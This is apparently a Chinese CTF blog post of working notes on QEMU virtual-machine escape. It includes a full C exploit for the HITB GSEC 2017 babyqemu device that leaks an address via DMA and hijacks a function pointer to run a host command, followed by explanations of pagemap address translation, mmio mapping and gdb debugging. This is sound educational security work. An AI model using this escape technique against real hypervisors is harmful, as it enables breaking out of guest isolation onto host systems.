---
title: QEMU 逃逸 潦草笔记
categories:
- CTF/Pwn
tags: 
---

> 更新中...

## 相关原理

例题：

- [qemu pwn-基础知识](https://xz.aliyun.com/t/6562)
- [从0到1的虚拟机逃逸三部曲](https://xz.aliyun.com/t/7345)
- [qemu逃逸学习](https://www.anquanke.com/post/id/235191)
- [QEMU逃逸初探（一）](https://www.anquanke.com/post/id/254906)
- [VM escape 之 QEMU Case Study](https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/)
- [VM escape-QEMU Case Study](https://cool-y.github.io/2021/04/10/vm-escape1/)
- [从qemu逃逸到逃跑](https://www.anquanke.com/post/id/256977)
- [2019强网杯线下赛qemu虚拟机逃逸](https://bbs.pediy.com/thread-252385.htm)
- [QEMU虚拟化逃逸学习之：WCTF2019 VirtualHole](https://xz.aliyun.com/t/5773)
- [qemu逃逸学习笔记](https://blog.csdn.net/qq_31457355/article/details/117170589)

主要是打实现在qemu进程中的PCI设备：

- [深入PCI与PCIe之一：硬件篇](https://zhuanlan.zhihu.com/p/26172972)
- [深入PCI与PCIe之二：软件篇](https://zhuanlan.zhihu.com/p/26244141)

- [PCI介绍](http://tianyu-code.top/Linux%E5%86%85%E6%A0%B8/PCI%E4%BB%8B%E7%BB%8D/)
- [x86 CPU地址空间分配](http://tianyu-code.top/Linux%E5%86%85%E6%A0%B8/x86CPU%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D/)
- [PCIe设备发现过程](https://blog.csdn.net/yhb1047818384/article/details/71076371)

x86的低速外设应该由南桥来管理，不过随着时代的发展相关技术架构也在变化：

- [现在主板上没有南桥北桥芯片组了？](https://zhuanlan.zhihu.com/p/461982828)
- [主板上的南桥和北桥是什么意思？](https://zhuanlan.zhihu.com/p/375804757)
- [主板上的南北桥是什么东西？](https://www.zhihu.com/question/66881178)
- [为什么不把南桥集成进CPU？CPU和南桥芯片中什么资源最珍贵？](https://zhuanlan.zhihu.com/p/47479121)

x86 CPU访问io端口的编号部分是定死的，应该是是现在CPU上，可以通过查看CPU的datasheet确定一些编号：

- [Is there a specification of x86 I/O port assignment?](https://stackoverflow.com/questions/14194798/is-there-a-specification-of-x86-i-o-port-assignment)
- [如何找到英特尔芯片组/CPU的数据手册（datasheet）？](https://zhuanlan.zhihu.com/p/138657102)
- [Technical Resources: Intel® Core™ Processors](https://www.intel.com/content/www/us/en/products/docs/processors/core/core-technical-resources.html)

例如A20地址线的0x92端口，其实已经废弃了：

- [A20 line](https://en.wikipedia.org/wiki/A20_line)
- [关于A20](https://blog.csdn.net/longintchar/article/details/79365928)

有关于地址转换：

- [VM escape 之 QEMU Case Study](https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/)
- [用户态进程如何得到虚拟地址对应的物理地址？](https://cloud.tencent.com/developer/article/1722573)
- [Linux kernel 笔记 （48）——CONFIG_STRICT_DEVMEM和/dev/crash](https://nanxiao.me/linux-kernel-note-48-config_strict_devmem-and-dev-crash/)
- [pagemap: report swap location for shared pages](https://lore.kernel.org/linux-fsdevel/YO8a4FpvBVEIBgjK@t490s/T/)

有关于qemu内存：

- [Qemu 虚拟机内存初始化源码分析](https://www.anquanke.com/post/id/224571)
- [MMIO内存模拟原理](https://blog.csdn.net/huang987246510/article/details/123101595)

## HITB GSEC2017 babyqemu

- [QEMU Escape学习笔记](https://www.anquanke.com/post/id/224199)
- [qemu pwn-hitb gesc 2017 babyqemu writeup](https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup)
- [CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu](https://www.giantbranch.cn/2020/01/02/CTF%20QEMU%20%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%E4%B9%8BHITB-GSEC-2017-babyqemu/)

自己写了一遍exp，为了便于理解对一些代码做出了简化调整：

- 简化了地址转换
- 全局变量只留一个mmio的交互地址
- mmio交互使用/dev/mem直接映射物理地址

```c
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

void * mmio;

void mmio_write(uint32_t addr, uint32_t value){
    *(uint32_t *)(mmio + addr) = value;
}

uint64_t gva2gpa(void * addr){
    uint64_t page;
    int fd = open("/proc/self/pagemap",0);
    lseek(fd,((uint64_t)addr >> 12 << 3),0);
    read(fd,&page,8);
    return ((page & 0x7fffffffffffff) << 12 ) | ((uint64_t)addr & 0xfff);
}

void set_dma_cpy(uint32_t dst, uint32_t src, uint32_t len){
    mmio_write(0x88,dst);
    mmio_write(0x80,src);
    mmio_write(0x90,len);
}

void copy_to_dma(uint32_t dma,void * src, uint32_t len){
    set_dma_cpy(dma+0x40000,gva2gpa(src),len);
    mmio_write(0x98,1);sleep(1);
}

void copy_from_dma(void * dst,uint32_t dma, uint32_t len){
    set_dma_cpy(gva2gpa(dst),dma+0x40000,len);
    mmio_write(0x98,1|2);sleep(1);
}

void dma_enc(uint32_t dma, uint32_t len){
    set_dma_cpy(0,dma+0x40000,len);
    mmio_write(0x98,1|2|4);
}

int main(){
    mmio = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfea00000);
    
    uint64_t leak_enc;
    copy_from_dma(&leak_enc,0x1000,8);

    uint64_t system_plt  = leak_enc  - 0x283DD0 + 0x1FDB18;
    
    char * cmd = "gnome-calculator;";
    copy_to_dma(0x200,cmd,strlen(cmd));
    copy_to_dma(0x1000,&system_plt,8);
    dma_enc(0x200,0);
}
```

```
➜  gcc exp.c -static -o exp
➜  find . | cpio -H newc -o > ../../rootfs.cpio
```

### 转换

在qemu逃逸的exp中，一般都有个将用户态虚拟地址转换为物理地址的函数。首先，需要这么个函数的原因是：用户态程序直接与PCI外设交互时，PCI外设需要通过物理地址访问一片用户态程序的内存，并且由于是直接交互，内核不经手，所以没人帮我们转换地址，因此要自行转换。

但用户态程序与PCI外设进行mmio进行交互的过程本身，只需要mmap出一片内存，所以在用户态程序的视角下，不需要显式的物理地址参与。如果二者交互的所有信息都仅通过mmio这片内存进行中转，那就彻底不需要什么地址转换了。但很遗憾，PCI外设不是这么用的，看看PCI真实的设备都有什么吧！显卡，网卡，声卡，这些外设必然要和我们的程序进行大量的数据交互，所以mmio这一小片内存多用于设置参数、控制命令等，可以将mmio的功能理解为关键信息的中转站、通信自举过程的第一个信道，而真正的交互buf内存需要用户程序另开一片，因此这个交互buf的地址信息就通过mmio这一小片内存传递给PCI外设，PCI外设通过buf的物理地址对其进行读写操作，当外设操作完成时，想办法通知用户态程序即可。

因此，不是所有的qemu逃逸题目都需要这么个地址转换函数。如果在针对PCI设备的qemu逃逸题目中，如果出现了进行手工转换的物理地址，那这个地址最终应该出现在与PCI外设交互的数据中。如本题exp中，只在设置dma参数中使用了地址转换函数：用户态程序将用户空间的虚拟地址转成物理地址并通过对mmap出来的mmio内存进行写操作，设置给dma。

```c
void set_dma_cpy(uint32_t dst, uint32_t src, uint32_t len){
    mmio_write(0x88,dst);
    mmio_write(0x80,src);
    mmio_write(0x90,len);
}

void copy_to_dma(uint32_t dma,void * src, uint32_t len){
    set_dma_cpy(dma+0x40000,gva2gpa(src),len);
    mmio_write(0x98,1);sleep(1);
}

void copy_from_dma(void * dst,uint32_t dma, uint32_t len){
    set_dma_cpy(gva2gpa(dst),dma+0x40000,len);
    mmio_write(0x98,1|2);sleep(1);
}
```

地址转换的原理很简单：[用户态进程如何得到虚拟地址对应的物理地址？](https://cloud.tencent.com/developer/article/1722573)，简单来说就是linux直接给用户态进程留了个接口文件：/proc/self/pagemap，然后用你想转换的地址信息作为偏移去读这个文件就行了，可以理解为查表。不过需要注意，每个表项的大小为8字节，所以地址信息作为偏移需要乘8。但在qemu逃逸的exp中，前人的地址转换很令人费解，尤其是((uintptr_t)addr >> 9) & ~7 这句，怎么也想不明白为啥出来个9：

```c
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        die("open pagemap");
    }
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}
```

通过getconf可以确定页大小，确实是4k，那页内偏移显然是占了12位，哪来的9？

```
# getconf PAGESIZE
4096
```

后来发现[VM escape 之 QEMU Case Study](https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/)这篇文章说明白了，因为/proc/self/pagemap表项的大小是8字节，所以右移12位的地址作为查找索引，还要乘8，即2的3次方。因此就是12-3=9，是两步合成一步写了...至于`& ~7`也是由于合成一步写的处理。我不知道这种写法除了令人费解以外，还有什么价值。至少漏洞利用的情景下，就是个简单的查表，不需要考虑效率，因此修改为如下代码：

```c
uint64_t gva2gpa(void * addr){
    uint64_t page;
    int fd = open("/proc/self/pagemap",0);
    lseek(fd,((uint64_t)addr >> 12 << 3),0);
    read(fd,&page,8);
    return ((page & 0x7fffffffffffff) << 12 ) | ((uint64_t)addr & 0xfff);
}
```

### 交互

煜博多年前写过：

- [虚拟化逃逸的攻击面及交互方式](http://brieflyx.me/2019/linux-tools/qemu-escape-attack-surface/)

除了常见的使用resource0这种文件映射到内存交互：

```c
int    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
void * mmio    = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
```

还可以直接使用/dev/mem文件，映射物理内存，物理内存地址可以由config、或resource文件的得到：

```c
void * mmio    = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfea00000);

/*
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fea00000 0x00000000feafffff 0x0000000000040200

# cat /sys/devices/pci0000\:00/0000\:00\:04.0/config | hexdump -C
00000000  34 12 33 23 03 01 10 00  10 00 ff 00 00 00 00 00  |4.3#............|
00000010  00 00 a0 fe 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*/
```

两种方式均可，但无论那种方式，在mmap时均须映射为可读写：`PROT_READ（1） | PROT_WRITE（2）`，共享：`MAP_SHARED（1）`的内存。从原理上来看，二者都是在用户的地址空间里，映射了一片内存，这片内存最终对应为物理地址0xfea00000，只是使用的linux接口不同。但如果你将mmio映射出来用户空间的地址，送进我们的地址转换函数，结果会是空的，无法查出来对应的0xfea00000:

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <inttypes.h>
#include <unistd.h>

uint64_t gva2gpa(void * addr){
    uint64_t page;
    int fd = open("/proc/self/pagemap",0);
    lseek(fd,((uint64_t)addr >> 12 << 3),0);
    read(fd,&page,8);
    return ((page & 0x7fffffffffffff) << 12 ) | ((uint64_t)addr & 0xfff);
}

int main(){
    void * mmio_mem   = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfea00000);
    printf("[+] gva: mmio mem from /dev/mem: %p\n", mmio_mem);
    printf("[+] gpa: mmio mem from /dev/mem: %p\n", (void *)gva2gpa(mmio_mem));

    int    mmio_fd    = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    void * mmio       = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    printf("[+] gva: mmio mem from resource0: %p\n", mmio);
    printf("[+] gpa: mmio mem from resource0: %p\n", (void *)gva2gpa(mmio));
}
```

执行结果：

```c
# ./exp
[+] gva: mmio mem from /dev/mem: 0x7f3457277000
[+] gpa: mmio mem from /dev/mem: (nil)
[+] gva: mmio mem from resource0: 0x7f3457276000
[+] gpa: mmio mem from resource0: (nil)
```

这应该是linux内核提供的/proc/self/pagemap接口并没实现对外设物理地址的查找，可能因为这并不一片真正的物理内存，但提供的/dev/mem接口的确可以将外设的物理地址映射到用户空间。所以别看外设和内存都对应着一个物理地址，但是在使用以及处理过程中会有细节的差异。另外经过尝试用dd直接操作/dev/mem访问mmio也不是很好用。

### 逆向

本题有符号，可以发现，这个设备就是照着qemu的示例PCI设备edu改的，因此可以对照参考。

- [https://elixir.bootlin.com/qemu/v2.9.0-rc5/source/hw/misc/edu.c](https://elixir.bootlin.com/qemu/v2.9.0-rc5/source/hw/misc/edu.c)
- [https://github.com/qemu/qemu/blob/v2.9.0-rc5/hw/misc/edu.c](https://github.com/qemu/qemu/blob/v2.9.0-rc5/hw/misc/edu.c)
- [qemu edu设备介绍](https://zhuanlan.zhihu.com/p/350947593)
- [qemu虚拟化-pci设备模拟](https://blog.csdn.net/qq_16054639/article/details/112537372)

由于有符号，也很容易发现处理函数，所以在IDA中只需做简单处理即可，主要是对于几个函数的参数的结构体识别。


ida

timer

uint32


如果没调试符号，就麻烦了，从识别漏洞函数，到分析漏洞，再到调试，就会需要导入符号，对比二进制，逆向结构体等处理，这会很麻烦。之后再搞。

### 调试

可以直接使用gdb拉起qemu进程，去掉随机化的影响。

```c
➜  cat gdb.cmd 
set args \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-monitor /dev/null \
-m 64M --nographic \
-L pc-bios  \
-device hitb,id=vda
➜  gdb ./qemu-system-x86_64 -x gdb.cmd
```

本题有符号，可以在gdb中调试方便，使用info types确认结构体定义存在：

```c
pwndbg> info types HitbState
All types matching regular expression "HitbState":

File /mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c:
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    QemuThread thread;
    QemuMutex thr_mutex;
    QemuCond thr_cond;
    _Bool stopping;
    uint32_t addr4;
    uint32_t fact;
    uint32_t status;
    uint32_t irq_status;
    struct dma_state dma;
    QEMUTimer dma_timer;
    char dma_buf[4096];
    void (*enc)(char *, unsigned int);
    uint64_t dma_mask;
} HitbState;
```

但要注意，HitbState是由typedef struct声明的，所以在查看对应结构体时不用在前添加struct：

```c
pwndbg> p *((struct HitbState *)(0x555558757fe0))
No struct type named HitbState.
```

直接使用HitbState即可：

```c
pwndbg> p *((HitbState *)(0x555558757fe0))
```

如果打印结果太长而只想查看结构体中的部分成员可以使用如下方式：

```c
pwndbg> set $a = *((HitbState *)(0x555558757fe0))
pwndbg> p /x $a.dma 
$20 = {
  src = 0x41000, 
  dst = 0x20ed478, 
  cnt = 0x8, 
  cmd = 0x3
}
```

### 总结

